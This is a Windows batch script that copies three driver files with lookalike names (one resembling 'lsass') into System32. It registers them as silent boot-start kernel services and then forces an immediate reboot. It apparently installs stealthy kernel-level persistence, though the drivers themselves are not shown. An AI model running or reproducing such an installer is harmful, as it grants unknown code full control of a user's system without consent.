@echo off
setlocal

set "WORKDIR=%~dp0"
set "sys32Dir=C:\Windows\System32"

if exist "%WORKDIR%cvas.sys" (
    copy /y "%WORKDIR%cvas.sys" "%sys32Dir%"
)
if exist "%WORKDIR%vcas.sys" (
    copy /y "%WORKDIR%vcas.sys" "%sys32Dir%"
)
if exist "%WORKDIR%vcsass.sys" (
    copy /y "%WORKDIR%vcsass.sys" "%sys32Dir%"
)

sc create cvas binPath= "C:\Windows\System32\cvas.sys" DisplayName= "cvas" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1
sc start cvas

sc create vcas binPath= "C:\Windows\System32\vcas.sys" DisplayName= "vcas" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1
sc start vcas

sc create vcsass binPath= "C:\Windows\System32\vcsass.sys" DisplayName= "vcsass" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1
sc start vcsass

echo Drivers installed. Rebooting...
shutdown /r /t 0 /f
